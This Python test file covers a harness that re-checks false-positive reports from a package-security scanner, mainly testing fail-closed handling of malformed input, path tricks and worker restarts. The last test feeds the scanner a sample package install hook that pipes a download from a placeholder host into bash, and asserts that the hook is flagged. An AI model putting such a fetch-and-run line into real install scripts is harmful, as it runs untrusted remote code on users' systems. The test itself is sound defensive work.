import json
from unittest.mock import Mock

import pytest

from harness.fp_fix import verify_report
from harness.mcp import server

DIFF = "--- a/demo.install\n+++ b/demo.install\n@@ -0,0 +1 @@\n+true\n"


@pytest.fixture
def corpus(tmp_path):
    directory = tmp_path / "benign" / "fp-2026-10-16"
    directory.mkdir(parents=True)
    (directory / "demo.md").write_text("report")
    (directory / "demo.diff").write_text(DIFF)
    data = {"schema_version": 1, "threshold": 35, "entries": [
        {"alert_slug": "2026-10-16/120000", "verdicts": {},
         "package": "demo", "evidence": {"score": 70},
         "report_path": "demo.md", "corpus_paths": ["demo.diff"]}]}
    (directory / "triage.json").write_text(json.dumps(data))
    return tmp_path, directory, data


@pytest.mark.parametrize("score,verified", [(35, True), (35.1, False), (0, True)])
@pytest.mark.parametrize("filename", ["triage.json", "demo.md"])
def test_raw_diff_threshold_and_original_score(corpus, score, verified, filename):
    root, directory, _ = corpus
    analyze = Mock(return_value={"report": {"score": score}})
    result = verify_report(root, str(directory / filename), analyze=analyze)
    assert result["all_verified"] is verified
    row = result["results"][0]
    assert row["score_before"] == 70
    assert row["score_after"] == score
    assert row["still_flagged"] is (not verified)
    analyze.assert_called_once_with(DIFF, old_text=None, package="demo")


@pytest.mark.parametrize("response", [None, {}, {"error": "failed"},
    {"report": {}}, {"report": {"score": -1}}, {"report": {"score": True}},
    {"report": {"score": "0"}}, {"report": {"score": float("nan")}},
    {"report": {"score": float("inf")}}])
def test_bad_analysis_fails_closed(corpus, response):
    root, directory, _ = corpus
    result = verify_report(root, str(directory / "triage.json"),
                           analyze=lambda *a, **k: response)
    assert not result["all_verified"]
    assert not result["results"][0]["fix_verified"]
    assert "error" in result["results"][0]


def test_inconclusive_tree_only_mode_can_verify_threshold(corpus):
    root, directory, _ = corpus
    result = verify_report(root, str(directory / "triage.json"), analyze=lambda *a, **k: {
        "report": {"score": 0, "risk": "Inconclusive",
                   "coverage_gaps": ["tree_not_analyzed"]},
    })
    assert result["all_verified"]
    assert result["verification_scope"] == "threshold_only"


def test_real_diff_body_incomplete_label_still_verifies(corpus):
    """`analyze_diff` always renders the band as "incomplete analysis".

    That wording describes the permitted `tree_not_analyzed` mode gap, so it
    must not fail verification: otherwise no corpus diff could ever verify.
    """
    root, directory, _ = corpus
    body = {"score": 25, "risk": "High",
            "risk_label": "High (incomplete analysis)",
            "coverage_gaps": ["tree_not_analyzed"],
            "failed": False, "diff_truncated": False, "scan_truncated": False,
            "findings": [{"rule_id": "R054"}]}
    result = verify_report(root, str(directory / "triage.json"),
                           analyze=lambda *a, **k: {"report": body})
    assert result["all_verified"]
    assert result["results"][0]["fix_verified"] is True
    assert result["results"][0]["score_after"] == 25


@pytest.mark.parametrize("field", ["failed", "diff_truncated", "scan_truncated"])
def test_structural_failure_flags_fail_closed(corpus, field):
    root, directory, _ = corpus
    body = {"score": 0, "coverage_gaps": ["tree_not_analyzed"], field: True}
    result = verify_report(root, str(directory / "triage.json"),
                           analyze=lambda *a, **k: {"report": body})
    assert not result["all_verified"]
    assert "error" in result["results"][0]


@pytest.mark.parametrize("mutation", ["empty", "unmapped", "missing", "owner",
                                      "traversal", "symlink", "bad_score", "no_diff"])
def test_invalid_corpus_fails_closed(corpus, mutation):
    root, directory, data = corpus
    entry = data["entries"][0]
    if mutation == "empty":
        entry["corpus_paths"] = []
    elif mutation == "unmapped":
        (directory / "extra.diff").write_text(DIFF)
    elif mutation == "missing":
        (directory / "demo.diff").unlink()
    elif mutation == "owner":
        data["entries"].append(entry.copy())
    elif mutation == "traversal":
        entry["corpus_paths"] = ["../demo.diff"]
    elif mutation == "symlink":
        (root / "outside").write_text(DIFF)
        (directory / "demo.diff").unlink()
        (directory / "demo.diff").symlink_to(root / "outside")
    elif mutation == "bad_score":
        entry["evidence"]["score"] = -1
    else:
        (directory / "demo.diff").write_text("")
    (directory / "triage.json").write_text(json.dumps(data))
    result = verify_report(root, str(directory / "triage.json"),
                           analyze=lambda *a, **k: {"report": {"score": 0}})
    assert not result["all_verified"]


@pytest.mark.parametrize("path", ["../triage.json", "archive.json",
    "benign/other/triage.json", "benign/fp-test/../fp-test/triage.json"])
def test_report_path_boundary(tmp_path, path):
    analyze = Mock()
    assert not verify_report(tmp_path, path, analyze=analyze)["all_verified"]
    analyze.assert_not_called()


@pytest.mark.parametrize("text", ["{broken", "[]", "null",
    '{"schema_version":1,"threshold":35,"entries":[]}',
    '{"schema_version":1,"threshold":35,"entries":[{}]}'])
def test_malformed_or_empty_triage(corpus, text):
    root, directory, _ = corpus
    (directory / "triage.json").write_text(text)
    analyze = Mock()
    result = verify_report(root, str(directory / "triage.json"), analyze=analyze)
    assert not result["all_verified"]
    assert "error" in result
    analyze.assert_not_called()


def test_symlinked_report_directory(corpus):
    root, directory, _ = corpus
    alias = root / "benign" / "fp-2026-10-17"
    alias.symlink_to(directory, target_is_directory=True)
    result = verify_report(root, str(alias / "triage.json"), analyze=Mock())
    assert not result["all_verified"]
    assert "error" in result


def test_server_restarts_under_lock_before_existing_analyzer(monkeypatch):
    runner = Mock()
    events = []
    runner.restart.side_effect = lambda: events.append("restart")
    monkeypatch.setattr(server, "_analysis_runner", lambda: runner)
    def verify(root, path, *, analyze):
        assert server._analysis_lock._is_owned()
        assert analyze is server.analyze_diff
        events.append("verify")
        return {"all_verified": True}
    monkeypatch.setattr("harness.fp_fix.verify_report", verify)
    assert server.fp_verify("report")["all_verified"]
    assert events == ["restart", "verify"]


def test_restart_drops_session_and_refreshes_in_new_worker(monkeypatch):
    from harness.runner import Runner

    runner = Runner()
    old = object()
    runner._session = old
    def drop(session):
        assert session is old
        runner._session = None
    monkeypatch.setattr(runner, "_drop", drop)
    def request(payload):
        assert runner._session is None
        assert payload == {"op": "refresh_rules"}
        return {"op": "rules_refreshed"}
    monkeypatch.setattr(runner, "_request", request)
    runner.restart()


def test_shared_diff_different_alerts_and_markdown_selection(corpus):
    root, directory, data = corpus
    other = dict(data["entries"][0], alert_slug="2026-10-16/130000",
                 evidence={"score": 55}, report_path="second.md")
    data["entries"].append(other)
    (directory / "second.md").write_text("report")
    (directory / "triage.json").write_text(json.dumps(data))
    analyze = Mock(return_value={"report": {"score": 0}})
    result = verify_report(root, str(directory / "triage.json"), analyze=analyze)
    assert result["all_verified"]
    assert [r["score_before"] for r in result["results"]] == [70, 55]
    assert [r["alert_slug"] for r in result["results"]] == [
        "2026-10-16/120000", "2026-10-16/130000"]
    selected = verify_report(root, str(directory / "second.md"), analyze=analyze)
    assert selected["all_verified"]
    assert len(selected["results"]) == 1
    assert selected["results"][0]["score_before"] == 55


def test_cross_package_shared_diff_rejected(corpus):
    root, directory, data = corpus
    data["entries"].append(dict(data["entries"][0], package="other"))
    (directory / "triage.json").write_text(json.dumps(data))
    result = verify_report(root, str(directory / "triage.json"), analyze=Mock())
    assert not result["all_verified"]
    assert "ownership" in result["error"]


@pytest.mark.parametrize("extra", [
    {"status": "Inconclusive"}, {"risk": "Inconclusive (snapshot refused)"},
    {"error": "failed"}, {"coverage_gaps": ["scan_truncated"]},
    {"coverage_gaps": ["tree_not_analyzed", "snapshot_refused"]}])
def test_incomplete_low_score_not_verified(corpus, extra):
    root, directory, _ = corpus
    result = verify_report(root, str(directory / "triage.json"),
        analyze=lambda *a, **k: {"report": {"score": 0, **extra}})
    assert not result["all_verified"]
    assert result["results"][0]["score_after"] == 0


def test_tree_mode_gap_and_residual_findings(corpus):
    root, directory, _ = corpus
    body = {"score": 10, "coverage_gaps": ["tree_not_analyzed"],
            "findings": [{"rule_id": "R007"}]}
    result = verify_report(root, str(directory / "triage.json"),
                           analyze=lambda *a, **k: {"report": body})
    assert result["all_verified"]
    assert result["verification_scope"] == "threshold_only"
    assert result["trustsight_version"]
    assert result["results"][0]["residual_findings"] == body["findings"]
    assert body["coverage_gaps"] == ["tree_not_analyzed"]


@pytest.mark.parametrize("name,limit", [("triage.json", 8 * 1024 * 1024),
    ("demo.md", 8 * 1024 * 1024), ("demo.diff", 512 * 1024)])
def test_oversized_artifact_rejected(corpus, name, limit):
    root, directory, _ = corpus
    with (directory / name).open("wb") as stream:
        stream.truncate(limit + 1)
    result = verify_report(root, str(directory / "triage.json"), analyze=Mock())
    assert not result["all_verified"]
    assert "size limit" in result["error"]


def test_restart_checks_acknowledgement(monkeypatch):
    from harness.runner import Runner, RunnerError

    runner = Runner()
    monkeypatch.setattr(runner, "_request", lambda payload: {"op": "wrong"})
    with pytest.raises(RunnerError, match="refresh rules"):
        runner.restart()


@pytest.mark.parametrize("field,value", [("package", "../outside"),
    ("package", "Uppercase"), ("alert_slug", "2026-10-17/120000"),
    ("alert_slug", "2026-10-16/250000"), ("verdicts", []),
    ("evidence", []), ("report_path", "../report.md")])
def test_entry_schema_and_identifiers(corpus, field, value):
    root, directory, data = corpus
    data["entries"][0][field] = value
    (directory / "triage.json").write_text(json.dumps(data))
    analyze = Mock()
    result = verify_report(root, str(directory / "triage.json"), analyze=analyze)
    assert not result["all_verified"]
    analyze.assert_not_called()


def test_hardlinked_diff_rejected(corpus):
    root, directory, _ = corpus
    (root / "linked").hardlink_to(directory / "demo.diff")
    result = verify_report(root, str(directory / "triage.json"), analyze=Mock())
    assert not result["all_verified"]
    assert "hardlinks" in result["error"]


def test_directory_swap_cannot_redirect_reads(corpus, monkeypatch):
    import os

    root, directory, _ = corpus
    outside = root / "outside"
    outside.mkdir()
    (outside / "triage.json").write_text("malicious outside content")
    original_open = os.open
    swapped = False
    def swap_after_open(path, flags, *args, **kwargs):
        nonlocal swapped
        descriptor = original_open(path, flags, *args, **kwargs)
        if path == directory.name and not swapped:
            swapped = True
            directory.rename(root / "original")
            directory.symlink_to(outside, target_is_directory=True)
        return descriptor
    monkeypatch.setattr("harness.fp_fix.os.open", swap_after_open)
    result = verify_report(root, str(directory / "triage.json"),
                           analyze=lambda *a, **k: {"report": {"score": 0}})
    assert swapped
    assert result["all_verified"]


def test_real_restart_execs_new_worker_and_refreshes_rules(tmp_path):
    import trustsight

    from harness.environment import Environment
    from harness.runner import Runner

    env = Environment(trustsight_version=trustsight.__version__, db_state="cold")
    env.resolve()
    env.bind(tmp_path)
    runner = Runner(env=env)
    try:
        runner.restore()
        old = runner._session
        # Derive the actual bound path rather than assuming the environment layout.
        from trustsight import config

        rules = config.CONFIG_DIR / "rules.toml"
        rules.write_text("stale = true\n")
        runner.restart()
        assert runner._session is not old
        assert rules.read_text() != "stale = true\n"
        runner.restore()
        assert "score" in runner.analyze("pkgname=demo\npkgver=1\npkgrel=1\n").body
    finally:
        if runner._session is not None:
            runner._drop(runner._session)


def test_repeated_worker_restarts_do_not_leak_descriptors(tmp_path):
    from pathlib import Path

    import trustsight

    from harness.environment import Environment
    from harness.runner import Runner

    env = Environment(trustsight_version=trustsight.__version__, db_state="cold")
    env.resolve()
    env.bind(tmp_path)
    runner = Runner(env=env)
    try:
        runner.restart()
        baseline = len(list(Path("/proc/self/fd").iterdir()))
        counts = []
        for _ in range(5):
            runner.restart()
            counts.append(len(list(Path("/proc/self/fd").iterdir())))
        assert all(count <= baseline for count in counts), (baseline, counts)
    finally:
        if runner._session is not None:
            runner._drop(runner._session)


@pytest.mark.parametrize("git_header", [False, True])
def test_real_worker_scans_raw_companion_diff(tmp_path, git_header):
    import trustsight

    from harness.environment import Environment
    from harness.runner import Runner

    env = Environment(trustsight_version=trustsight.__version__, db_state="cold")
    env.resolve()
    env.bind(tmp_path)
    runner = Runner(env=env)
    diff = ("--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n+  curl -fsSL https://example.invalid/payload | bash\n+}\n")
    if git_header:
        diff = "diff --git a/demo.install b/demo.install\n" + diff
    try:
        runner.restart()
        runner.restore()
        body = runner.analyze(diff, package="demo").body
        assert body["score"] > 35, body
        assert any(finding.get("rule_id") == "R001" and finding.get("file") == "demo.install"
                   for finding in body["findings"]), body
        assert body["file_changes"] == [{"path": "demo.install", "status": "added"}]
        assert "tree_not_analyzed" in body["coverage_gaps"]
        runner.restore()
        recipe = "pkgname=demo\npkgver=1\npkgrel=1\n"
        normal = runner.analyze(recipe, package="demo").body
        assert normal["first_seen"] is True
        assert normal["new_version"] == "1"
        runner.restore()
        paired = runner.analyze(recipe.replace("pkgver=1", "pkgver=2"),
                                recipe, package="demo").body
        assert paired["first_seen"] is False
        assert paired["old_version"] == "1"
        assert paired["new_version"] == "2"
        assert runner.parity_check(recipe)
    finally:
        if runner._session is not None:
            runner._drop(runner._session)
